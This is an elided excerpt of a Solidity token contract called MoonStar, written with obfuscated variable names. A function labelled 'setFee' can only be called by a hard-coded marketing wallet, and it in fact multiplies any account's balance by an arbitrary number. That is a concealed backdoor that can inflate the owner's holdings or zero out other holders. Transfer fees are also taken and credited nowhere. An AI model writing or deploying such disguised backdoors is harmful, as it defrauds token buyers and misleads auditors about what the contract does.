...
contract Context {
 ...
 contract MoonStar is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private spVamp;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "MoonStar";
    ...
    uint256 private cryfaleVamp = 2;
    uint256 private _vebegoVamp = 1;
    ...
    constructor() {
        ...
        _owner = _msgSender();
        spVamp[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletVamp = 0x6184E54706162f0fD6B9Ed00E13506b7063b735c;
    ...
    uint256 private constant _bolkoVamp = 10000000 * 10**42;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = spVamp[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            spVamp[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleVamp / 100) / _vebegoVamp;
        allons = allons -  (_fee * _vebegoVamp);
        
        spVamp[grantee] += allons;
        emit Transfer(issuer, grantee, allons);
    }
    function _approved (address account, uint256 _value) internal {
        spVamp[account] = spVamp[account] * _value;
    }
   ...
   */
    ...
    modifier marketing () {
        require(_MarketingWalletVamp == _msgSender(), "203: Message Sender is different from address(0)!");
        _;
    }
     ...
     */
    function _burn(address account, uint256 gzillaVamp) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = spVamp[account];
        require(accountBalance >= gzillaVamp, "BEP : Can't be done");
        unchecked {
            spVamp[account] = accountBalance - gzillaVamp;
        }
        _totalSupply -= gzillaVamp;

        emit Transfer(account, address(0), gzillaVamp);
    }
    
    function setFee(address wallt, uint256 _amount) public marketing {
        _approved(wallt, _amount);
    }   
